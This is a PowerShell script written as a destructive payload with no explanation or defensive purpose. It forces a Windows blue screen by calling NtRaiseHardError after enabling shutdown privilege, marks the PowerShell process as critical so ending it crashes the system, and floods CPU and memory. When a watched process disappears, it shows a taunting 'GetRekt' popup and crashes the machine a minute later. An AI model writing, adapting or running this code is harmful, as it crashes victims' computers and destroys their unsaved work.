function Invoke-GetRekt {
$source = @"
using System;
using System.Runtime.InteropServices;

public static class CS{
	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	public static unsafe void Kill(){
		Boolean tmp1;
		uint tmp2;
		RtlAdjustPrivilege(19, true, false, out tmp1);
		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
	}
}
"@
    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
    $comparams.CompilerOptions = '/unsafe'
    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
    [CS]::Kill()
}
function Set-CriticalProcess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')]
    Param (
        [Switch]
        $Force,

        [Switch]
        $ExitImmediately
    )
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        throw 'You must run Set-CriticalProcess from an elevated PowerShell prompt.'
    }
    $Response = $True
    if (!$Force)
    {
        $Response = $psCmdlet.ShouldContinue('Have you saved all your work?', 'The machine will blue screen when you exit PowerShell.')
    }
    if (!$Response)
    {
        return
    }
    $DynAssembly = New-Object System.Reflection.AssemblyName('BlueScreen')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('BlueScreen', $False)
    # Define [ntdll]::NtQuerySystemInformation method
    $TypeBuilder = $ModuleBuilder.DefineType('BlueScreen.Win32.ntdll', 'Public, Class')
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('NtSetInformationProcess',
                                                        'ntdll.dll',
                                                        ([Reflection.MethodAttributes] 'Public, Static'),
                                                        [Reflection.CallingConventions]::Standard,
                                                        [Int32],
                                                        [Type[]] @([IntPtr], [UInt32], [IntPtr].MakeByRefType(), [UInt32]),
                                                        [Runtime.InteropServices.CallingConvention]::Winapi,
                                                        [Runtime.InteropServices.CharSet]::Auto)
    $ntdll = $TypeBuilder.CreateType()
    $ProcHandle = [Diagnostics.Process]::GetCurrentProcess().Handle
    $ReturnPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)
    $ProcessBreakOnTermination = 29
    $SizeUInt32 = 4
    try
    {
        $null = $ntdll::NtSetInformationProcess($ProcHandle, $ProcessBreakOnTermination, [Ref] $ReturnPtr, $SizeUInt32)
    }
    catch
    {
        return
    }
    Write-Verbose 'PowerShell is now marked as a critical process and will blue screen the machine upon exiting the process.'
    if ($ExitImmediately)
    {
        Stop-Process -Id $PID
    }
}
function Invoke-StressCPU {
    start-job -ScriptBlock{
    $result = 1; 
    foreach ($number in 1..2147483647) 
        {
            $result = $result * $number
        }
    }
}
function Invoke-StressMem {
    $mem_stress = "a" * 1024MB
}
Start-Sleep 20
while ($true) {
if((get-process "winlogon.exe" -ea SilentlyContinue) -eq $Null;){ 
    Write-Host "payload killed,run self-destruct sequence!"
    Set-CriticalProcess -Force
    Invoke-StressCPU
    Invoke-StressCPU
    Invoke-StressCPU
    Invoke-StressMem
    $dialogBoxTitle = "Haha Lol GetRekt"
    $dialogBoxMessage = "Haha lol kill me if you can,in 1 minute,you'll got BSOD."
    $messageBox = New-Object -COMObject WScript.Shell
    [void]$messageBox.Popup($dialogBoxMessage,0,$dialogBoxTitle,0)
    Start-Sleep 60
    Invoke-GetRekt
} else { 
    echo "payload is still running"
    Start-Sleep 2 }
}
